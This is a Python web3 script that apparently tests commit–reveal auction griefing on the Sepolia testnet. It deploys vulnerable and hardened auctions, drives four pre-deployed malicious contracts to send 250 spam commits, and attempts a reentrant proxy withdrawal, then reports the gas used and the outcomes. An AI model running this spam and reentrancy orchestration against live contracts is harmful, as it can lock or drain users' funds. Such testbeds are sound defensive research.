#!/usr/bin/env python3
"""
GasManipulation.py

Orchestrator for Commit–Reveal griefing scenarios (Sepolia).
- Uses existing malicious contracts (addresses via env or fallback known addresses)
- Uses provided MOCK_TOKEN_ADDRESS (ERC20) for deposits/refunds
- Deploys fresh VulnerableAuction and HardenedAuction per scenario
- Calls malicious.approveToken(token, auction, amount) before committing
- Runs N_ATTACK spam commits (malicious contract acting as bidder via forwarders)
- Runs Alice (honest) commit+reveal on both auctions
- Finalizes vulnerable (single finalize) and hardened (paged finalize)
- Attempts malicious proxyWithdraw and Alice withdraw on hardened
- Produces per-scenario JSON reports under ./reports/

Usage (example):
  export WEB3_RPC_URL="https://sepolia.infura.io/v3/..."
  export DEPLOYER_KEY="0x..."
  export ATTACKER_KEY="0x..."
  export ALICE_KEY="0x..."
  export MOCK_TOKEN_ADDRESS="0x..."
  # optional: supply malicious addresses or use deployed defaults
  export MAL_REVERT="0xfd3D..."
  export MAL_GASBURN="0xc3a7..."
  export MAL_REENTRANT="0x1B7f..."
  export MAL_CONDITIONAL="0xD454..."
  python3 scripts/GasManipulation.py
"""

import os
import json
import time
from pathlib import Path
from web3 import Web3
from eth_account import Account
from hexbytes import HexBytes

# ---------- Config/defaults ----------
ARTIFACT_DIRS = ["out", "out_artifacts", "out"]
REPORT_DIR = Path("reports")
REPORT_DIR.mkdir(exist_ok=True)
VULN_NAME = "VulnerableAuction"
HARD_NAME = "HardenedAuction"
DEFAULTS = {
    "COMMIT_DEPOSIT": 1,
    "MAX_COMMITS_PER_ADDRESS": 5,
    "N_ATTACK": 250,
    "APPROVE_BUFFER_MULT": 1  # multiplier to compute approve amount: deposit * N_ATTACK * multiplier
}

# ---------- Environment ----------
WEB3_RPC_URL = os.environ.get("WEB3_RPC_URL")
DEPLOYER_KEY = os.environ.get("DEPLOYER_KEY")
ATTACKER_KEY = os.environ.get("ATTACKER_KEY")
ALICE_KEY = os.environ.get("ALICE_KEY")
MOCK_TOKEN_ADDRESS = os.environ.get("MOCK_TOKEN_ADDRESS")

MAL_REVERT = os.environ.get("MAL_REVERT")
MAL_GASBURN = os.environ.get("MAL_GASBURN")
MAL_REENTRANT = os.environ.get("MAL_REENTRANT")
MAL_CONDITIONAL = os.environ.get("MAL_CONDITIONAL")

if not (MAL_REVERT and MAL_GASBURN and MAL_REENTRANT and MAL_CONDITIONAL):
    raise SystemExit("Set MAL_REVERT, MAL_GASBURN, MAL_REENTRANT and MAL_CONDITIONAL environment variables with deployed attacker contract addresses")

# normalize to checksum
MAL_REVERT  = Web3.to_checksum_address(MAL_REVERT)
MAL_GASBURN = Web3.to_checksum_address(MAL_GASBURN)
MAL_REENTRANT = Web3.to_checksum_address(MAL_REENTRANT)
MAL_CONDITIONAL = Web3.to_checksum_address(MAL_CONDITIONAL)

SCENARIOS = {
    "Revert": MAL_REVERT,
    "GasBurn": MAL_GASBURN,
    "Reentrant": MAL_REENTRANT,
    "Conditional": MAL_CONDITIONAL
}

COMMIT_DEPOSIT = int(os.environ.get("COMMIT_DEPOSIT", str(DEFAULTS["COMMIT_DEPOSIT"])))
MAX_COMMITS_PER_ADDRESS = int(os.environ.get("MAX_COMMITS_PER_ADDRESS", str(DEFAULTS["MAX_COMMITS_PER_ADDRESS"])))
N_ATTACK = int(os.environ.get("N_ATTACK", str(DEFAULTS["N_ATTACK"])))
APPROVE_BUFFER_MULT = float(os.environ.get("APPROVE_BUFFER_MULT", str(DEFAULTS["APPROVE_BUFFER_MULT"])))

# ---------- Helpers ----------
def find_artifact(name):
    for d in ARTIFACT_DIRS:
        p = Path(d) / f"{name}.json"
        if p.exists():
            return p
    raise FileNotFoundError(f"artifact {name}.json not found; run `forge build`")

def load_artifact(name):
    p = find_artifact(name)
    with open(p, "r") as f:
        return json.load(f)

def to_checksum(addr):
    return Web3.to_checksum_address(addr)

def wait_receipt(w3, txhash, timeout=600):
    start = time.time()
    while True:
        r = w3.eth.get_transaction_receipt(txhash)
        if r is not None:
            return r
        if time.time() - start > timeout:
            raise TimeoutError("Timeout waiting for receipt")
        time.sleep(1)

def send_signed_tx(w3, acct, tx):
    signed = acct.sign_transaction(tx)
    txh = w3.eth.send_raw_transaction(signed.rawTransaction)
    return wait_receipt(w3, txh)

def build_and_send_contract_tx(w3, acct, contract_fn, gas=300000, value=0):
    tx = contract_fn.build_transaction({
        "from": acct.address,
        "nonce": w3.eth.get_transaction_count(acct.address),
        "gas": gas,
        "gasPrice": w3.eth.gas_price,
        "value": value,
        "chainId": w3.eth.chain_id
    })
    return send_signed_tx(w3, acct, tx)

def short_receipt(r):
    return {"txHash": r.transactionHash.hex(), "gasUsed": r.gasUsed, "status": r.status, "blockNumber": r.blockNumber}

# ---------- Start ----------
if not (WEB3_RPC_URL and DEPLOYER_KEY and ATTACKER_KEY and ALICE_KEY and MOCK_TOKEN_ADDRESS):
    raise SystemExit("Set WEB3_RPC_URL, DEPLOYER_KEY, ATTACKER_KEY, ALICE_KEY, MOCK_TOKEN_ADDRESS env vars before running")

w3 = Web3(Web3.HTTPProvider(WEB3_RPC_URL))
chain_id = w3.eth.chain_id
print("Connected RPC:", WEB3_RPC_URL, "chainId:", chain_id)

deployer = Account.from_key(DEPLOYER_KEY)
attacker = Account.from_key(ATTACKER_KEY)
alice = Account.from_key(ALICE_KEY)

print("Deployer:", deployer.address)
print("Attacker(controller):", attacker.address)
print("Alice:", alice.address)
print("Token:", MOCK_TOKEN_ADDRESS)
print("N_ATTACK:", N_ATTACK, "COMMIT_DEPOSIT:", COMMIT_DEPOSIT, "MAX_COMMITS_PER_ADDRESS:", MAX_COMMITS_PER_ADDRESS)

# Load artifacts
vuln_art = load_artifact(VULN_NAME)
hard_art = load_artifact(HARD_NAME)

# Minimal token ABI (extendable if your MockToken artifact exists)
try:
    token_art = load_artifact("MockToken")
    token_abi = token_art["abi"]
except FileNotFoundError:
    token_abi = [
        {"name":"balanceOf","type":"function","inputs":[{"name":"owner","type":"address"}],"outputs":[{"name":"","type":"uint256"}]},
        {"name":"transfer","type":"function","inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"outputs":[{"name":"","type":"bool"}]},
        {"name":"transferFrom","type":"function","inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"outputs":[{"name":"","type":"bool"}]},
        {"name":"approve","type":"function","inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"outputs":[{"name":"","type":"bool"}]},
        {"name":"allowance","type":"function","inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"outputs":[{"name":"","type":"uint256"}]},
    ]

token = w3.eth.contract(address=to_checksum(MOCK_TOKEN_ADDRESS), abi=token_abi)

# Map scenarios -> malicious addresses
SCENARIOS = {
    "Revert": to_checksum(MAL_REVERT),
    "GasBurn": to_checksum(MAL_GASBURN),
    "Reentrant": to_checksum(MAL_REENTRANT),
    "Conditional": to_checksum(MAL_CONDITIONAL)
}

# Helper to attach malicious contract ABI/contract object (tries to load artifact, else fallback minimal ABI)
def get_mal_contract_obj(name, address):
    try:
        art = load_artifact(name if name.startswith("Malicious") else f"Malicious{name}")
        abi = art["abi"]
    except Exception:
        # fallback minimal ABI (approveToken + forwarders + proxyWithdraw)
        abi = [
            {"name":"approveToken","type":"function","inputs":[{"name":"tokenAddress","type":"address"},{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"outputs":[{"name":"","type":"bool"}]},
            {"name":"forwardCommitVulnerable","type":"function","inputs":[{"name":"auction","type":"address"},{"name":"auctionId","type":"uint256"},{"name":"commitHash","type":"bytes32"},{"name":"depositAmount","type":"uint256"}],"outputs":[]},
            {"name":"forwardCommitHardened","type":"function","inputs":[{"name":"auction","type":"address"},{"name":"auctionId","type":"uint256"},{"name":"commitHash","type":"bytes32"}],"outputs":[]},
            {"name":"forwardReveal","type":"function","inputs":[{"name":"auction","type":"address"},{"name":"auctionId","type":"uint256"},{"name":"bidAmount","type":"uint256"},{"name":"salt","type":"bytes32"}],"outputs":[]},
            {"name":"proxyWithdraw","type":"function","inputs":[{"name":"auction","type":"address"},{"name":"auctionId","type":"uint256"}],"outputs":[]}
        ]
    return w3.eth.contract(address=address, abi=abi)

# Deploy auctions helper
def deploy_auctions():
    # deploy VulnerableAuction(token)
    vuln_contract = w3.eth.contract(abi=vuln_art["abi"], bytecode=vuln_art["bytecode"])
    tx1 = vuln_contract.constructor(MOCK_TOKEN_ADDRESS).build_transaction({
        "from": deployer.address,
        "nonce": w3.eth.get_transaction_count(deployer.address),
        "gas": 2_500_000,
        "gasPrice": w3.eth.gas_price,
        "chainId": w3.eth.chain_id
    })
    r1 = send_signed_tx(w3, deployer, tx1)
    vuln_addr = r1.contractAddress
    vuln = w3.eth.contract(address=to_checksum(vuln_addr), abi=vuln_art["abi"])
    print("Deployed VulnerableAuction at", vuln_addr, "gasUsed", r1.gasUsed)

    # deploy HardenedAuction(token, commitDeposit, maxCommitsPerAddress)
    hard_contract = w3.eth.contract(abi=hard_art["abi"], bytecode=hard_art["bytecode"])
    tx2 = hard_contract.constructor(MOCK_TOKEN_ADDRESS, COMMIT_DEPOSIT, MAX_COMMITS_PER_ADDRESS).build_transaction({
        "from": deployer.address,
        "nonce": w3.eth.get_transaction_count(deployer.address),
        "gas": 3_000_000,
        "gasPrice": w3.eth.gas_price,
        "chainId": w3.eth.chain_id
    })
    r2 = send_signed_tx(w3, deployer, tx2)
    hard_addr = r2.contractAddress
    hard = w3.eth.contract(address=to_checksum(hard_addr), abi=hard_art["abi"])
    print("Deployed HardenedAuction at", hard_addr, "gasUsed", r2.gasUsed)

    return {"vuln": {"contract": vuln, "address": vuln_addr, "receipt": short_receipt(r1)},
            "hard": {"contract": hard, "address": hard_addr, "receipt": short_receipt(r2)}}

# newAuction helper
def new_auction_and_id(contract):
    rc = build_and_send_contract_tx(w3, deployer, contract.functions.newAuction(), gas=200000)
    aid = contract.functions.auctionCounter().call()
    return aid, short_receipt(rc)

# deterministic commit hash helper
def make_commit_hash(bid_int, salt_bytes):
    # produce 32-byte commit hash: keccak(bid_bytes(32) + salt)
    bid_bytes = bid_int.to_bytes(32, "big")
    return Web3.keccak(bid_bytes + salt_bytes)

# single scenario runner
def run_scenario(label):
    print("\n=== SCENARIO:", label)
    report = {"label": label, "timestamp": int(time.time()), "N_attack": N_ATTACK}
    # 1) deploy auctions
    auctions = deploy_auctions()
    vuln = auctions["vuln"]["contract"]
    hard = auctions["hard"]["contract"]
    vuln_id, _ = new_auction_and_id(vuln)
    hard_id, _ = new_auction_and_id(hard)
    report["vuln_address"] = auctions["vuln"]["address"]
    report["hard_address"] = auctions["hard"]["address"]
    report["vuln_id"] = vuln_id
    report["hard_id"] = hard_id

    # 2) attach malicious contract
    mal_addr = SCENARIOS[label]
    mal_contract = get_mal_contract_obj("Malicious"+label if not label.startswith("Malicious") else label, to_checksum(mal_addr))
    report["malicious_address"] = mal_addr

    # 3) fund malicious contract with tokens if deployer has tokens
    required_tokens = COMMIT_DEPOSIT * N_ATTACK
    try:
        deployer_bal = token.functions.balanceOf(deployer.address).call()
        if deployer_bal >= required_tokens:
            tx = token.functions.transfer(mal_addr, required_tokens).build_transaction({
                "from": deployer.address,
                "nonce": w3.eth.get_transaction_count(deployer.address),
                "gas": 120000,
                "gasPrice": w3.eth.gas_price,
                "chainId": w3.eth.chain_id
            })
            r = send_signed_tx(w3, deployer, tx)
            print("Transferred tokens to malicious contract:", required_tokens, "tx", r.transactionHash.hex())
            report.setdefault("transfers", []).append(short_receipt(r))
        else:
            print("Deployer token balance low; ensure malicious contract has tokens/allowances before run.")
    except Exception as e:
        print("Token transfer to malicious failed:", e)
        report.setdefault("funding_errors", []).append(str(e))

    # 4) call approveToken on malicious for both auctions
    try:
        approve_amt = int(COMMIT_DEPOSIT * N_ATTACK * APPROVE_BUFFER_MULT)
        print("Approving amt for malicious:", approve_amt)
        fn_v = mal_contract.functions.approveToken(MOCK_TOKEN_ADDRESS, auctions["vuln"]["address"], approve_amt)
        r_v = build_and_send_contract_tx(w3, attacker, fn_v, gas=150000)
        report.setdefault("mal_approvals", []).append({"auction":"vuln", **short_receipt(r_v)})

        fn_h = mal_contract.functions.approveToken(MOCK_TOKEN_ADDRESS, auctions["hard"]["address"], approve_amt)
        r_h = build_and_send_contract_tx(w3, attacker, fn_h, gas=150000)
        report.setdefault("mal_approvals", []).append({"auction":"hard", **short_receipt(r_h)})

        # record allowance if token has allowance()
        try:
            al_v = token.functions.allowance(mal_addr, auctions["vuln"]["address"]).call()
            al_h = token.functions.allowance(mal_addr, auctions["hard"]["address"]).call()
            report.setdefault("mal_allowances", {})["vuln"] = al_v
            report.setdefault("mal_allowances", {})["hard"] = al_h
        except Exception:
            pass
    except Exception as e:
        print("approveToken not available or failed:", e)
        report.setdefault("mal_approvals_errors", []).append(str(e))

    # 5) ensure Alice has tokens
    alice_bal = token.functions.balanceOf(alice.address).call()
    alice_needed = COMMIT_DEPOSIT * 2
    if alice_bal < alice_needed:
        try:
            txf = token.functions.transfer(alice.address, alice_needed).build_transaction({
                "from": deployer.address,
                "nonce": w3.eth.get_transaction_count(deployer.address),
                "gas": 120000,
                "gasPrice": w3.eth.gas_price,
                "chainId": w3.eth.chain_id
            })
            rf = send_signed_tx(w3, deployer, txf)
            report.setdefault("funding", []).append(short_receipt(rf))
            print("Funded alice tokens:", alice_needed)
        except Exception as e:
            print("Could not fund Alice:", e)
            report.setdefault("funding_errors", []).append(str(e))

    # 6) Attacker commit loop (N_ATTACK)
    commit_hashes = []
    accepted = 0
    for i in range(N_ATTACK):
        salt = Web3.keccak(text=f"attack-{label}-{i}")
        ch = make_commit_hash(0, salt)  # zero bid spam
        try:
            # try vulnerable variant forwarder first (some mal contracts implement it)
            fn = mal_contract.functions.forwardCommitVulnerable(auctions["vuln"]["address"], vuln_id, ch, COMMIT_DEPOSIT)
            rc = build_and_send_contract_tx(w3, attacker, fn, gas=220000)
            commit_hashes.append(rc.transactionHash.hex())
            accepted += 1
        except Exception as e1:
            # fallback to hardened forwarder
            try:
                fn2 = mal_contract.functions.forwardCommitHardened(auctions["hard"]["address"], hard_id, ch)
                rc2 = build_and_send_contract_tx(w3, attacker, fn2, gas=220000)
                commit_hashes.append(rc2.transactionHash.hex())
                accepted += 1
            except Exception as e2:
                # log and continue
                report.setdefault("commit_errors", []).append({"i": i, "vuln_err": str(e1), "hard_err": str(e2)})
                continue
        if (i+1) % 50 == 0:
            print(f"Attacker commits: {i+1}/{N_ATTACK}")

    print("Attacker accepted commits:", accepted)
    report["attacker_accepted_commits"] = accepted
    report["commit_tx_hashes"] = commit_hashes

    # 7) Alice commit+reveal on both auctions
    def alice_commit_reveal(auction_contract, auction_id):
        salt = Web3.keccak(text=f"alice-{label}")
        bid = 1
        ch = make_commit_hash(bid, salt)
        # approve token for auction (if necessary)
        try:
            txa = token.functions.approve(auction_contract.address, COMMIT_DEPOSIT).build_transaction({
                "from": alice.address, "nonce": w3.eth.get_transaction_count(alice.address),
                "gas": 80000, "gasPrice": w3.eth.gas_price, "chainId": w3.eth.chain_id
            })
            send_signed_tx(w3, Account.from_key(ALICE_KEY), txa)
        except Exception:
            pass
        # commit
        try:
            txc = auction_contract.functions.commit(auction_id, ch, COMMIT_DEPOSIT).build_transaction({
                "from": alice.address, "nonce": w3.eth.get_transaction_count(alice.address),
                "gas": 200000, "gasPrice": w3.eth.gas_price, "chainId": w3.eth.chain_id
            })
            rc = send_signed_tx(w3, Account.from_key(ALICE_KEY), txc)
        except Exception as e:
            report.setdefault("alice_errors", []).append({"stage": "commit", "err": str(e)})
            return {}
        # reveal
        try:
            txr = auction_contract.functions.reveal(auction_id, bid, salt).build_transaction({
                "from": alice.address, "nonce": w3.eth.get_transaction_count(alice.address),
                "gas": 200000, "gasPrice": w3.eth.gas_price, "chainId": w3.eth.chain_id
            })
            rr = send_signed_tx(w3, Account.from_key(ALICE_KEY), txr)
            return {"commit": rc.transactionHash.hex(), "reveal": rr.transactionHash.hex()}
        except Exception as e:
            report.setdefault("alice_errors", []).append({"stage": "reveal", "err": str(e)})
            return {}

    report["alice_v"] = alice_commit_reveal(vuln, vuln_id)
    report["alice_h"] = alice_commit_reveal(hard, hard_id)

    # 8) Vulnerable finalize: try and capture revert or gas usage
    try:
        rc = build_and_send_contract_tx(w3, deployer, vuln.functions.finalize(vuln_id), gas=2_000_000)
        report["vulnerable_finalize"] = short_receipt(rc)
        print("Vulnerable finalize succeeded gasUsed:", rc.gasUsed)
    except Exception as e:
        report["vulnerable_finalize"] = {"status": "failed_or_reverted", "error": str(e)}
        print("Vulnerable finalize reverted / failed:", e)

    # 9) Hardened finalize paged
    report["hard_finalize_pages"] = []
    try:
        while True:
            rc = build_and_send_contract_tx(w3, deployer, hard.functions.finalizePaged(hard_id), gas=400000)
            report["hard_finalize_pages"].append(short_receipt(rc))
            finalized = hard.functions.isFinalized(hard_id).call()
            print("Paged finalize processed; gasUsed:", rc.gasUsed, "finalized:", finalized)
            if finalized:
                break
    except Exception as e:
        report.setdefault("hard_finalize_errors", []).append(str(e))
        print("Error during hard finalize paged:", e)

    # 10) Withdraw tests
    report["withdraws"] = {}
    # attempt malicious withdraw via proxy (expect fail or revert)
    try:
        fnw = mal_contract.functions.proxyWithdraw(auctions["hard"]["address"], hard_id)
        rcw = build_and_send_contract_tx(w3, attacker, fnw, gas=300000)
        report["withdraws"]["malicious"] = short_receipt(rcw)
    except Exception as e:
        report["withdraws"]["malicious"] = {"status": "failed", "error": str(e)}
        print("Malicious proxyWithdraw failed as expected:", e)

    # alice withdraw hardened (pull)
    try:
        rca = build_and_send_contract_tx(w3, Account.from_key(ALICE_KEY), hard.functions.withdraw(hard_id), gas=200000)
        report["withdraws"]["alice_h"] = short_receipt(rca)
        print("Alice withdraw hardened succeeded:", rca.transactionHash.hex())
    except Exception as e:
        report["withdraws"]["alice_h"] = {"status": "failed", "error": str(e)}
        print("Alice withdraw hardened failed:", e)

    # 11) balances snapshot
    try:
        report["balances_after"] = {
            "attacker_token": token.functions.balanceOf(attacker.address).call(),
            "alice_token": token.functions.balanceOf(alice.address).call(),
            "malicious_token": token.functions.balanceOf(mal_addr).call(),
            "auction_token_vuln": token.functions.balanceOf(auctions["vuln"]["address"]).call(),
            "auction_token_hard": token.functions.balanceOf(auctions["hard"]["address"]).call(),
        }
    except Exception:
        pass

    # save report
    outfn = REPORT_DIR / f"scenario_{label}_{int(time.time())}.json"
    with open(outfn, "w") as fh:
        json.dump(report, fh, indent=2)
    print("Saved report:", outfn)
    return report

# run all scenarios
summary = {}
for sc in ["Revert", "GasBurn", "Reentrant", "Conditional"]:
    try:
        summary[sc] = run_scenario(sc)
    except Exception as e:
        print("Scenario error:", sc, e)
        summary[sc] = {"error": str(e)}

# write summary
with open(REPORT_DIR / "summary.json", "w") as fh:
    json.dump(summary, fh, indent=2)

print("All scenarios complete. Reports saved to", REPORT_DIR)
